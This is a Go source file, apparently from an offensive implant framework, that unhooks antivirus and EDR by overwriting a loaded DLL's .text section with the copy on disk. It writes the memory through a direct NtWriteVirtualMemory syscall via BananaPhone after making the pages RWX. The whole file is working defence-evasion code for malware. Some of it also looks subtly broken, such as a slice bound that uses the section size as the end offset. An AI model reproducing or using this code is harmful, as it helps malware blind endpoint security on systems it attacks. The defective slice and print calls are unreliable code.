package main

import (
	"debug/pe"
	"fmt"
	"github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"syscall"
	"unsafe"
)

func banana() (uint16){
	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	//resolve the functions and extract the syscalls
	write, e := bp.GetSysID("ZwWriteVirtualMemory")
	if e != nil {
		panic(e)
	}
	return write
}

// RefreshPE reloads a DLL from disk into the current process
// in an attempt to erase AV or EDR hooks placed at runtime.
func RefreshPE(name string) error {
	//{{if .Config.Debug}}
	fmt.Printf("Reloading %s...\n", name)
	//{{end}}
	df, e := ioutil.ReadFile(name)
	if e != nil {
		return e
	}
	f, e := pe.Open(name)
	if e != nil {
		return e
	}
	x := f.Section(".text")
	ddf := df[x.Offset:x.Size]
	return writeGoodBytes(ddf, name, x.VirtualAddress)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32) error {

	write:= banana()
	t, e := syscall.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)


	var old uint32
	var thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
	//thisThread,err := syscall.GetCurrentProcess()
	//if err != nil {
	//	return err
	//}

/*
	//NtProtectVirtualMemory
	_, r := bananaphone.Syscall(
		protect,
		thisThread,
		uintptr(dllOffset),
		uintptr(len(b)),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&old)),
	)
	if r != nil {
		fmt.Println("1")
		return r
	}
*/
	e = windows.VirtualProtect(
		uintptr(dllOffset),
		uintptr(len(b)),
		windows.PAGE_EXECUTE_READWRITE,
		&old,
	)
	if e != nil {
		return e
	}

	//{{if .Config.Debug}}
	fmt.Println("Made memory map RWX")
	//{{end}}
/*
	for i := 0; i < len(b); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}
*/
	//NtWriteVirtualMemory
	_, r := bananaphone.Syscall(
		write, //NtWriteVirtualMemory
		uintptr(thisThread),
		uintptr(dllOffset),
		uintptr(unsafe.Pointer(&b[0])),
		uintptr(len(b)),
		0,
	)
	if r != nil {
		fmt.Println("NtWriteVirtualMemory Error")
		return r
	}


	//{{if .Config.Debug}}
	fmt.Println("DLL overwritten")
	//{{end}}

/*
	//NtProtectVirtualMemory
	r1, r = bananaphone.Syscall(
		protect,
		uintptr(thisThread),
		uintptr(dllOffset),
		uintptr(len(b)),
		uintptr(old),
		uintptr(unsafe.Pointer(&old)),
	)
	if r != nil {
		fmt.Println("3 %s %x\n", r, r1)
		return r
	}
*/


	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), old, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	fmt.Println("Restored memory map permissions")
	//{{end}}
	return nil
}